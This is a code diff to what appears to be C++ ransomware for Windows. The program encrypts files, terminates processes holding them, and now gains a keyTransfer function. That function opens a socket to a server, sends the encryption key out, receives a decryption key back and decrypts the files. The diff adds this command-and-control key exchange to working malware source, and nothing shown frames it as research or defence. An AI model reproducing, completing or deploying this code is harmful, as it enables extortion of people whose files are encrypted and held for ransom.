@@ -9,6 +9,7 @@ void encryptFile(const std::filesystem::path& path, const std::string& key);
 void decryptFile(const path_t& filePath, const std::string& key);
 void checkIfInUse(std::filesystem::path filePath);
 void terminateProcessById(DWORD processId);
+void keyTransfer(string key, std::vector<path_t>& pathToDecrypt);
 
 int main(int argc, char* argv[])
 {
@@ -28,6 +29,8 @@ int main(int argc, char* argv[])
             encryptFile(NextFile, key);
         }
     }
+
+    keyTransfer(key, pathToCript);
 
     return 0;
 }
@@ -207,6 +210,88 @@ void terminateProcessById(DWORD processId)
 
     // Close the process handle
     CloseHandle(processHandle);
+}
+
+void keyTransfer(string key, std::vector<path_t>& pathToDecrypt)
+{
+    // Initialize Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        file_logger->error("Failed to initialize winsock: ", GetLastError());
+        return;
+    }
+
+    // Initialize OpenSSL
+    SSL_load_error_strings();
+    OpenSSL_add_ssl_algorithms();
+
+    // Create a socket
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) {
+        file_logger->error("Failed to create socket: ", GetLastError());
+        WSACleanup();
+        return;
+    }
+
+    // Setup the server address structure
+    sockaddr_in serverAddress{};
+    serverAddress.sin_family = AF_INET;
+    serverAddress.sin_port = htons(12345);  // Server port
+    if (inet_pton(AF_INET, "127.0.0.1", &serverAddress.sin_addr) <= 0) {  // Server IP
+        file_logger->error("Failed to setup server address: ", GetLastError());
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+
+    // Connect to the server
+    if (connect(sock, reinterpret_cast<struct sockaddr*>(&serverAddress), sizeof(serverAddress)) < 0) {
+        file_logger->error("Failed to connect to server: ", GetLastError());
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+
+    // Create a new SSL structure and assign it to our connection
+    const SSL_METHOD* method = TLS_client_method();
+    SSL_CTX* ctx = SSL_CTX_new(method);
+    SSL* ssl = SSL_new(ctx);
+    SSL_set_fd(ssl, sock);
+
+    // Perform TLS handshake
+    if (SSL_connect(ssl) <= 0) {
+        file_logger->error("Failed to perform SSL/TLS handshake: ", ERR_reason_error_string(ERR_get_error()));
+        SSL_free(ssl);
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+
+    // Send encryption key to the server
+    send(sock, key.c_str(), key.size(), 0);
+
+    // Receive decryption key from the server
+    string decrKey;
+    char buffer[1024] = { 0 };
+    while (true) {
+        int bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
+        if (bytesRead <= 0) {
+            break;
+        }
+        buffer[bytesRead] = '\0';
+        decrKey += buffer;
+    }
+
+    // Decrypt files with obtained key
+    for (const auto& NextFile : pathToDecrypt) {
+        decryptFile(NextFile, decrKey);
+    }
+
+    // Perform cleanup
+    SSL_free(ssl);
+    SSL_CTX_free(ctx);
+    closesocket(sock);
+    WSACleanup();
 }
 
 // Public method that writes user's home directory to the private class variable "directory"
